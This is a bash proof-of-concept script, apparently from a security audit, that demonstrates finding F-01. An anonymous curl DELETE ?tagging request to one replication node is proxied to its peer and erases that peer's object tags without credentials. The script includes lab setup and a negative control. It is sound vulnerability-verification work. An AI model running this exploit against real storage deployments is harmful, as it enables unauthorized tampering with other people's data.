#!/usr/bin/env bash
# F-01 — Unauthenticated cross-site object-tag deletion via DeleteObjectTagging replication proxy.
# Prereq: setup/02-two-node-replication.sh   (nodes A:19000, B:19001, bucket vault, A->B target)
set -euo pipefail
. "$(dirname "$0")/../../setup/env.sh"

echo "=== setup: object + tags on B only (absent on A) ==="
mcsh '
mc alias set A '"$NODE_A"' '"$ROOT_USER"' '"$ROOT_PASS"' >/dev/null 2>&1
mc alias set B '"$NODE_B"' '"$ROOT_USER"' '"$ROOT_PASS"' >/dev/null 2>&1
# make B not push back to A so the object stays only on B
mc replicate rm B/vault --all --force >/dev/null 2>&1 || true
printf "peer-only\n" | mc pipe B/vault/secret.txt >/dev/null 2>&1
mc tag set B/vault/secret.txt "team=finance&classification=secret" 2>&1 | tail -1
sleep 2
printf "  [baseline] B tags: "; mc tag list B/vault/secret.txt 2>&1 | tr "\n" " "; echo
'
echo
echo "=== ATTACK: anonymous (no credentials) DELETE ?tagging to node A ==="
echo "  \$ curl -s -i -X DELETE '$NODE_A/vault/secret.txt?tagging'"
curl -s -i -X DELETE "$NODE_A/vault/secret.txt?tagging" | grep -iE 'HTTP/|x-minio-tagging-proxied' | head -3
echo
echo "=== negative control: same anonymous DELETE for an object present LOCALLY on B ==="
curl -s -o /dev/null -w "  local-object DELETE -> HTTP %{http_code} (auth enforced on non-proxy path)\n" -X DELETE "$NODE_B/vault/secret.txt?tagging"
echo
echo "=== result: are B's tags gone (deleted by the unauthenticated request)? ==="
mcsh '
mc alias set B '"$NODE_B"' '"$ROOT_USER"' '"$ROOT_PASS"' >/dev/null 2>&1
printf "  B tags after attack: "; mc tag list B/vault/secret.txt 2>&1 | tr "\n" " "; echo
'
echo
echo "VULNERABLE if: attack returned HTTP 204 and B tags = 'No tags found'; control returned 403."
